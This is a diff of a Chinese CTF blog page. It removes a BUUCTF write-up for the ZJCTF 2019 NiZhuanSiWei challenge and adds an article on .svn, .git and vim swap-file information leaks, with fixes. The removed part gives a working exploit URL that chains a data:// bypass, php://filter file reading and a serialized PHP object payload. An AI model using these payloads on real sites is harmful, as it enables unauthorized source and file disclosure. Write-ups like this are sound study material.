@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="BUUCTF-ZJCTF做题笔记, Chenluo">
+    <meta name="keywords" content="信息泄露, Chenluo">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>BUUCTF-ZJCTF做题笔记 | Chenluo</title>
+    <title>信息泄露 | Chenluo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -322,12 +322,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">BUUCTF-ZJCTF做题笔记</h1>
+                    <h1 class="description center-align post-title">信息泄露</h1>
                 </div>
             </div>
         </div>
@@ -461,7 +461,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-06-02
+                    2021-06-04
                 </div>
                 
 
@@ -470,7 +470,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    181
+                    669
                 </div>
                 
 
@@ -490,37 +490,47 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><ul>
-<li>直接构造payload:</li>
+                <h1 id="信息泄漏"><a href="#信息泄漏" class="headerlink" title="信息泄漏"></a>信息泄漏</h1><h2 id="SVN-info"><a href="#SVN-info" class="headerlink" title="SVN info"></a>SVN info</h2><h3 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述:"></a>1. 漏洞描述:</h3><ul>
+<li><p>使用<code>svn</code>管理本地文件代码的过程，会自动生成一个<code>.svn</code>的文件夹—包含这网站的重要信息</p>
+</li>
+<li><p>如果网站管理员在发布网站的时候，没有使用到处功能，而是直接复制微网站后台的文件夹，就会导致<code>.svn</code>文件暴露在外网环境</p>
+</li>
+<li><p>黑客可以借助其中包含的用于版本信息追踪的<code>entries</code>文件，获取站点信息</p>
+</li>
 </ul>
-<pre class="line-numbers language-url" data-language="url"><code class="language-url">view-source:http:&#x2F;&#x2F;5e61447f-2d28-46b3-b6b8-8939e1fbded5.node3.buuoj.cn&#x2F;?text&#x3D;data:%2f%2ftext%2fplain,welcome%20to%20the%20zjctf&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:%22Flag%22:1:&#123;s:4:%22file%22;s:8:%22flag.php%22;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>第一个利用data协议绕过</p>
-<pre class="line-numbers language-none"><code class="language-none">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>第二个利用php://filter，读取</p>
-<pre class="line-numbers language-url" data-language="url"><code class="language-url">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>第三个序列化</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">&#123;</span>  <span class="token comment">//flag.php</span>
-    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
-            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"U R SO CLOSE !///COME ON PLZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Flag"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>最后读取flag时，要将<code>php://filter</code>去掉</p>
+<h3 id="2-漏洞危害"><a href="#2-漏洞危害" class="headerlink" title="2. 漏洞危害:"></a>2. 漏洞危害:</h3><ul>
+<li>攻击者可以利用<code>.svn/entries</code>文件，查找网站的应用程序源代码、svn服务器账号密码等信息。</li>
+<li>SVN产生的<code>.svn</code>目录还包含了<code>.svn-base</code>结尾的源代码文件副本（低版本SVN具体路径为<code>text-base</code>目录，高版本SVN为<code>pristine</code>目录），如果服务器没有对此类后缀做解析，黑客则可以直接获得文件源代码。<ol>
+<li>攻击者利用该漏洞可下载网站源代码，获得数据库的连接账号密码等敏感信息；</li>
+<li>攻击者可通过获取的源代码进一步分析出新的系统漏洞，从而进一步入侵系统；</li>
+</ol>
+</li>
+</ul>
+<h3 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h3><ul>
+<li>查找服务器上所有.svn隐藏文件夹，删除。</li>
+<li>开发人员在使用SVN时，严格使用导出功能，禁止直接复制代码。</li>
+</ul>
+<h2 id="Git-info"><a href="#Git-info" class="headerlink" title="Git info"></a>Git info</h2><h3 id="1-漏洞描述-1"><a href="#1-漏洞描述-1" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h3><ul>
+<li>开发者在使用git作为版本控制时，在一个目录中初始化一个仓库以后 , 会在这个目录下产生一个名叫 <code>.git</code> 的隐藏文件夹，这个文件夹里面保存了这个仓库的所有版本等一系列信息。</li>
+<li>如果服务器将<code>.git</code>文件夹放在了web目录下，就可能导致攻击者利用<code>.git</code>文件夹内的信息获取应用程序所有源代码。</li>
+</ul>
+<h3 id="2-漏洞危害-1"><a href="#2-漏洞危害-1" class="headerlink" title="2. 漏洞危害:"></a>2. 漏洞危害:</h3><ul>
+<li>攻击者利用此漏洞可获取应用程序源代码，分析源码进行进一步攻击利用；</li>
+<li>攻击者利用此漏洞可获取数据配置信息，可能直接导致应用程序用户信息泄漏，设置获取服务器权限；</li>
+</ul>
+<h3 id="3-修复建议"><a href="#3-修复建议" class="headerlink" title="3. 修复建议"></a>3. 修复建议</h3><ol>
+<li><p>删除网站目录下的<code>.git</code>文件</p>
+</li>
+<li><p>中间件上设置<code>.git</code>目录访问权限，禁止访问</p>
+</li>
+</ol>
+<h2 id="vim文件备份以及缓冲"><a href="#vim文件备份以及缓冲" class="headerlink" title="vim文件备份以及缓冲"></a>vim文件备份以及缓冲</h2><ul>
+<li><p><code>vim</code>编辑的文件，在<code>vim</code><strong>异常退出</strong>的时候,会生成<code>.filename.swp</code>的交换文件，用来恢复文件依次为<code>.swo``.swn</code></p>
+<p>恢复命令</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> -r 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li><p><code>vim</code>编辑的文件，在修改的时候，会自动生成一个备份文件(修改之前的版本)</p>
+</li>
+</ul>
 
                 
             </div>
@@ -547,7 +557,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://echo-machile.github.io/2021/06/02/7890.html">http://echo-machile.github.io/2021/06/02/7890.html</a>
+                    <a href="http://echo-machile.github.io/2021/06/04/2332.html">http://echo-machile.github.io/2021/06/04/2332.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1040,17 +1050,18 @@ document.body.addEventListener('click', function(e) {
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/06/02/767.html">
+                <a href="/2021/06/04/2332.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="BUUCTF-MRCTF做题笔记">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="信息泄露">
                         
-                        <span class="card-title">BUUCTF-MRCTF做题笔记</span>
+                        <span class="card-title">信息泄露</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1060,9 +1071,9 @@ document.body.addEventListener('click', function(e) {
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-06-02
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-04
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1071,6 +1082,7 @@ document.body.addEventListener('click', function(e) {
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1089,13 +1101,13 @@ document.body.addEventListener('click', function(e) {
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/06/02/790.html">
+                <a href="/2021/06/04/7744.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="BUUCTF-网鼎杯做题笔记">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="ctfshow-信息收集">
                         
-                        <span class="card-title">BUUCTF-网鼎杯做题笔记</span>
+                        <span class="card-title">ctfshow-信息收集</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1106,7 +1118,7 @@ document.body.addEventListener('click', function(e) {
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-02
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-04
                             </span>
                         <span class="publish-author">
                             
@@ -1119,8 +1131,8 @@ document.body.addEventListener('click', function(e) {
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/BUUCTF/">
-                        <span class="chip bg-color">BUUCTF</span>
+                    <a href="/tags/CTFSHOW/">
+                        <span class="chip bg-color">CTFSHOW</span>
                     </a>
                     
                 </div>
